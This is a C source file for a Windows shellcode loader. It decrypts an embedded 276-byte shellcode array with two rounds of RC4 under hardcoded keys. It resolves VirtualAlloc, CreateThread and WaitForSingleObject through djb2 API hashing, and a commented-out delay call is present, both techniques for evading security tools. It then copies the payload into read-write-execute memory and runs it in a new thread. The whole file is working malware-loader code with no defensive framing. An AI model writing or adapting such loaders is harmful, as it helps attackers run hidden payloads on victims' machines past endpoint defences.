#include "APIHashing.h"
#include "RC4.h"

//#define DEBUG
#define SHELLCODE_SIZE 276
#define KEY2 "qsgfe67jl4hnzuo9px3wyk021mrctda8"
#define KEY1 "zko35jut8hgcfa4pn2iseyvxlr7q6wb9"

int Error(const char* msg) {
	printf("[ERROR] %s (%d)\n", msg, GetLastError());
	return 1;
}

int main()
{
	extern unsigned char shellcode[SHELLCODE_SIZE];
//	unsigned char shellcode[SHELLCODE_SIZE];
	API_TABLE apiTable = { 0 };
	InitializeAPITable(&apiTable);
	//DelayExecutionVia_WFSO(20);
	unsigned char outBuff[SHELLCODE_SIZE];
	unsigned char outBuff2[SHELLCODE_SIZE];
	unsigned char decryptRound2[SHELLCODE_SIZE];
	unsigned char decryptRound1[SHELLCODE_SIZE];

	/*
	printf("[+] ROUND 1: \n");
	RC4Crypt("47329wewawawa^&%%81bfdsamfda", shellcode, outBuff, SHELLCODE_SIZE);
	printf("\n[+] ROUND 2: \n");
	RC4Crypt("secondKey", outBuff, outBuff2, SHELLCODE_SIZE);

	printf("\n[+] DECRYPT ROUND 2: \n");
	RC4Crypt("secondKey", outBuff2, decryptRound2, SHELLCODE_SIZE);
	printf("\n[+] DECRYPT ROUND 1: \n");
	RC4Crypt("47329wewawawa^&%%81bfdsamfda", decryptRound2, decryptRound1, SHELLCODE_SIZE);
	*/
	printf("\n[+] DECRYPT ROUND 2: \n");
	RC4Crypt(KEY1, shellcode, decryptRound2, SHELLCODE_SIZE);
	printf("\n[+] DECRYPT ROUND 1: \n");
	RC4Crypt(KEY2, decryptRound2, shellcode, SHELLCODE_SIZE);

	//RC4Crypt("bababoo", outBuff, outBuff2, SHELLCODE_SIZE);


#ifdef DEBUG
	printf("[DEBUG] INITIAL_HASH : %d\n[DEBUG] INITIAL_SEED : %d\n", INITIAL_HASH, INITIAL_SEED);
	printf("[DEBUG - HASHES]\n#define KERNEL32_HASH\t\t\t%lu\n", HashStringDjb2A((PCHAR)"kernel32.dll"));
	printf("#define VIRTUALALLOC_HASH\t\t%lu\n", HashStringDjb2A((PCHAR)"VirtualAlloc"));
	printf("#define VIRTUALPROTECT_HASH\t\t%lu\n", HashStringDjb2A((PCHAR)"VirtualProtect"));
	printf("#define CREATETHREAD_HASH\t\t%lu\n", HashStringDjb2A((PCHAR)"CreateThread"));
	printf("#define WAITFORSINGLEOBJECT_HASH\t\t%lu\n", HashStringDjb2A((PCHAR)"WaitForSingleObject"));
	printf("#define CREATEREMOTETHREAD_HASH\t\t%lu\n[END - DEBUG - HASHES]\n", HashStringDjb2A((PCHAR)"CreateRemoteThread"));
	printf("[DEBUG COMPAR] %lu : %lu\n", KERNEL32_HASH, HashStringDjb2W((PWCHAR)L"kernel32.dll"));
	printf("[DEBUG COMPAR] 0x%p : 0x%p\n", CustomGetModuleHandleH(KERNEL32_HASH), GetModuleHandleA("kernel32"));
	//printf("========================================\n[DEBUG] ")
	//printf("[COMPAR] 0x%P : 0x%P\n", GetProcAddressReplacementH();
#endif


	
	LPVOID lpAddr = apiTable.pVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	/*
	if (!lpAddr)
		return Error("VirtualAlloc Failed");
	printf("[INFO] RWX Memory Allocated at 0x%p\n", lpAddr);
	*/

	RtlMoveMemory(lpAddr, shellcode, sizeof(shellcode));
	//printf("[INFO] Moving shellcode to 0x%p from 0x%p\n", lpAddr, shellcode);


	HANDLE hThread = apiTable.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAddr, NULL, 0, NULL);
	/*
	if (!hThread)
		return Error("CreateThread Failed");
	printf("[INFO] Creating thread with entry point 0x%p\n", lpAddr);
	*/

	DWORD dwWait = apiTable.pWaitForSingleObject(hThread, INFINITE);
	/*
	if (dwWait == WAIT_FAILED)
		return Error("WaitForSingleObject Failed");
	printf("[INFO] Done\n");
	*/
	return 0;
};
